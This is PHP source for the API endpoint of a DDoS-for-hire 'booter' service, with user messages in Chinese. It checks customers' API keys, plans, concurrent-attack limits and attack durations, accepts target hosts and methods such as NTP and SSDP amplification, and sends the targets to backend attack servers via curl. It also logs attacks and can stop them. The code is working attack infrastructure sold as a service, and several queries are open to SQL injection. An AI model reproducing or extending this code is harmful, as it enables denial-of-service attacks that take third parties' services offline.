<?php

	ob_start();
	require_once 'dash/includes/app/config.php';
	require_once 'dash/includes/app/init.php';

	error_reporting(0);


	$plansql = $odb -> prepare("SELECT `users`.`expire`, `users`.`api`, `plans`.`name`, `plans`.`concurrents`, `plans`.`mbt` FROM `users`, `plans` WHERE `plans`.`ID` = `users`.`membership` AND `users`.`api` = :id");
	$plansql -> execute(array(":id" => $_GET["key"]));
	$row = $plansql -> fetch(); 
	
	


	$usrow = $odb -> prepare("SELECT * FROM `users` WHERE `api` = :id");
	$usrow -> execute(array(":id" => $_GET["key"]));
	$usrow = $usrow -> fetch(); 
	$_SESSION['apiID']=$usrow["ID"];

	$l4 = true;
	$username = $usrow['username'];
	$date = date("d/m/Y", $row['expire']);
	if (!$user->hasMembership($odb)){
		$row['mbt'] = 'No membership';
		$row['concurrents'] = 'No membership';
		$row['name'] = 'No membership';
		$date = 'No membership';
	}
	if($row["api"]==Null){
		echo '{"error":"yes","data":"您的api key错误"}';
		exit;
	}
		$SQL = $odb -> prepare("SELECT `status` FROM `users` WHERE `username` = :username");
		$SQL -> execute(array(':username' => $username));
		$status = $SQL -> fetchColumn(0);
		if ($status == 1){
			$ban = $odb -> query("SELECT `reason` FROM `bans` WHERE `username` = '$username'") -> fetchColumn(0);
			if(empty($ban)){ 
			if($userInfo["ban_sbp"]==Null){
			$ban = "No reason given.";
			}
			else{
				$ban=$userInfo["ban_sbp"];
			}
			}
			$error = error('您的账号已经被封禁，原因: '.htmlspecialchars($ban));
			exit;
		}
		
	if(@$_GET["action"]=="start"){
			$host   = $_GET['host'];
			$time   = intval($_GET['time']);
			$method = $_GET['method'];
			$port = isset($_GET['port']) ? $_GET['port'] : '';

			$referer   = '';
			$cookie   = '';
			$emulation   = '';
			$postdata   = '';
			$mode   = '';
			$rmethod   = '';

			if (empty($host) || empty($time) || empty($method) || empty($port)) {
				die('{"error":"yes","data":"请填写所以参数"}');
			}


			//Check if the method is legit
			if (!ctype_alnum(str_replace(' ', '', $method))) {
				die('{"error":"yes","data":"Slots Full"}');
			}

			$SQL = $odb->prepare("SELECT COUNT(*) FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$countMethod = $SQL -> fetchColumn(0);

			if ($countMethod == 0) {
				die('{"error":"yes","data":"Slots Full"}');
			}

			//Check if the host is a valid url or IP
			$SQL = $odb->prepare("SELECT `type` FROM `methods` WHERE `name` = :method");
			$SQL -> execute(array(':method' => $method));
			$type = $SQL -> fetchColumn(0);
			$l4 = $type !== 'layer7';
			if ($type == 'layer7') {
				

				$referer   = "false";
				$cookie   = "https://google.com/";
				$postdata   = "/";
				$mode   ="";
				$rmethod   = "GET";

							
				//Verifying all fields
				/*if (empty($mode)) {
					die(error('Please verify all fields.'));
				}*/

				if (filter_var($host, FILTER_VALIDATE_URL) === FALSE) {
                     die('Host is not a valid URL. Use with http:// or https://');
				}
				

				$parameters = array(".gov", "https://blog.bathtubbashing.xyz", "dev.dststx.xyz", "forum_new.tendust.xyz", "dev.exitus.me", "dstat.one", "127.0.0.1", "dststx", "https://admin.kingblue.xyz", ";", "sberbank.ru", "tinkoff.ru", ".edu", "fsb", "mos.ru", "fsb.ru", "vk.com", "$", "{", "%", "<");

				foreach ($parameters as $parameter) {
					if (strpos($host, $parameter)) {
						die('此目标已经加入了黑名单中您无法提交.');
					}
				}

			} elseif (!filter_var($host, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
                die("Host $host is not a valid IP address");
            }

			//Check if host is blacklisted
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `blacklist` WHERE `data` = :host' AND `type` = 'victim'");
			$SQL -> execute(array(':host' => $host));
			$countBlacklist = $SQL -> fetchColumn(0);

			if ($countBlacklist > 0) {
				die('{"error":"yes","data":"错误"}');
			}
			
			
					if ($user->hasMembership2($odb)) {
			$SQL = $odb->prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0");
			$SQL -> execute(array(':username' => $username));
			$countRunning = $SQL -> fetchColumn(0);
			if ($countRunning >= $stats->concurrents2($odb, $username)) {
				die('{"error":"yes","data":"已经超出你套餐的并发数"}');
			}
		}

		//Check max boot time
		$SQLGetTime = $odb->prepare("SELECT `plans`.`mbt` FROM `plans` LEFT JOIN `users` ON `users`.`membership` = `plans`.`ID` WHERE `users`.`ID` = :id");
		$SQLGetTime->execute(array(':id' => $usrow['ID']));
		$maxTime = $SQLGetTime->fetchColumn(0);

		if (!$user->hasMembership2($odb) && $testboots == 1) {
			$maxTime = 60;
		}

		if ($time > $maxTime){
			die('{"error":"yes","data":"max bootime"}');
		}
		
		if ($_GET['method'] === "ssdp")
        if ($time > 60 || $time < 15) die('{"error":"yes","data":"此模式的最大攻击时间为60秒"}');
        if ($_GET['method'] === "ntp")
        if ($time > 60 || $time < 15) die('{"error":"yes","data":"此模式的最大攻击时间为60秒"}');
		
		if($time < 15){
			die('{"error":"yes","data":"15seconds minimum"}');
		}

		//Check open slots
		if ($stats->runningBoots($odb) > $maxattacks && $maxattacks > 0) {
			die('{"error":"yes","data":"卡槽已满没有空闲的服务器来执行你的任务"}');
		}

		
		// check cooldown
		
		if ($cooldown == 1) {
			die('正在冷却中请稍后重试!');
		}
		
		//Check if test boot has been launched
		if(!$user->hasMembership2($odb)){
			$testattack = $odb->query("SELECT `testattack` FROM `users` WHERE `username` = '$username'")->fetchColumn(0);
			if ($testboots == 1 && $testattack > 0) {
				die('You have already launched your test attack.');
			}
		}

        //Check rotation
        $i = 0;
		
		// Checks if the attack is VIP
		if ($vip == '1') { 
			$SQLSelectAPI = $odb -> prepare("SELECT * FROM `api` WHERE `vip` = '1' AND `methods` LIKE :method ORDER BY RAND()");
			$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
		} else { 
			$SQLSelectAPI = $odb -> prepare("SELECT * FROM `api` WHERE `vip` = '0' AND `methods` LIKE :method ORDER BY RAND()");
			$SQLSelectAPI -> execute(array(':method' => "%{$method}%"));
		  }

		  
        while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {

            if ($rotation == 1 && $i > 0) {
                break;
            }

            $name = $show['name'];
			$count = $odb->query("SELECT COUNT(*) FROM `logs` WHERE `handler` LIKE '%$name%' AND `time` + `date` > UNIX_TIMESTAMP() AND `stopped` = 0")->fetchColumn(0);

            if ($count >= $show['slots']) {
                continue;
            }

            $i++;
			
			if (!$l4) {
            	$arrayFind = array('[host]', '[postdata]', '[time]', '[method]');
				$arrayReplace = array($host, $postdata, $time, $method);
			} else {
				$arrayFind = array('[host]', '[port]', '[time]', '[method]');
				$arrayReplace = array($host, $port, $time, $method);
			}
            
            $APILink = $show['api'];
			$handler[] = $show['name'];
			$username = $usrow['username'];
  
            $APILink = str_replace($arrayFind, $arrayReplace, $APILink);
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $APILink);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
            $result = curl_exec($ch);
            curl_close($ch);

        }

        if ($i == 0) {
            die('{"error":"yes","data":"Slots Full"}');
        }

		//End of attacking servers script
		$handlers     = @implode(",", $handler);

		//Insert Logs
		$chart = date("d-m");
		$insertLogSQL = $odb->prepare("INSERT INTO `logs` VALUES(NULL, :user, :ip, :time, :method, :postdata, :mode, :rmethod, :cookie, UNIX_TIMESTAMP(), :chart, '0', :handler, :referer)");
		$insertLogSQL -> execute(array(':user' => $username, ':ip' => $host, ':time' => $time, ':method' => $method, ':cookie' => $cookie, ':postdata' => $postdata, ':mode' => $mode, ':rmethod' => $rmethod, ':chart' => $chart, ':handler' => $handlers, ':referer' => $referer));

		//Insert test attack
		if (!$user->hasMembership2($odb) && $testboots == 1) {
			$SQL = $odb->query("UPDATE `users` SET `testattack` = 1 WHERE `username` = '$username'");
		}

		
		// Gen Here
		
		
		$key = md5(microtime() . rand());
		$insertLogSQL = $odb->prepare("INSERT INTO `ping_sessions` VALUES(NULL, :ping_key, :user_id, :ping_ip, :ping_port)");
		$insertLogSQL -> execute(array(':ping_key' => $key, ':user_id' => $usrow['ID'], ':ping_ip' => $host, ':ping_port' => $port));
		
		$SQLGetTime = $odb->prepare("SELECT id FROM `logs` order by id desc LIMIT 1");
		$SQLGetTime->execute(array());
		$maxTime = $SQLGetTime->fetchColumn(0);
		print_r($maxTime);
			
			}
			
			
				if ($_GET["action"] == 'stop'){

		$stop = intval($_GET['id']);
		$SQLSelect = $odb -> query("SELECT * FROM `logs` WHERE `id` = '$stop'");

		while ($show = $SQLSelect->fetch(PDO::FETCH_ASSOC)) {
			$host = $show['ip'];
			$port = isset($show['port']) ? $show['port'] : '80';
			$time = $show['time'];
			$method = $show['method'];
			$handler = $show['handler'];
			$command = $odb->query("SELECT `command` FROM `methods` WHERE `name` = '$method'")->fetchColumn(0);
		}

		$handlers = explode(",", $handler);
	
		foreach ($handlers as $handler){
			
			$SQLSelectAPI = $odb -> query("SELECT `api` FROM `api` WHERE `name` = '$handler' ORDER BY `id` DESC");
	
			while ($show = $SQLSelectAPI->fetch(PDO::FETCH_ASSOC)) {

				$APILink = $show['api'];

			}
			
			$arrayFind = array('[host]', '[port]', '[time]', '[method]');
			$arrayReplace = array($host, $port, $time, $method);
		
			$APILink = str_replace($arrayFind, $arrayReplace, $APILink);
			$stopcommand  = "&method=STOP";
			$stopapi = $APILink . $stopcommand;
			
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $stopapi);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_TIMEOUT, 3);
			curl_exec($ch);
			curl_close($ch);
			
		}
		
		$SQL = $odb -> query("UPDATE `logs` SET `stopped` = 1 WHERE `id` = '$stop'");
		die('Attack has been stopped!');
		
	}
?>
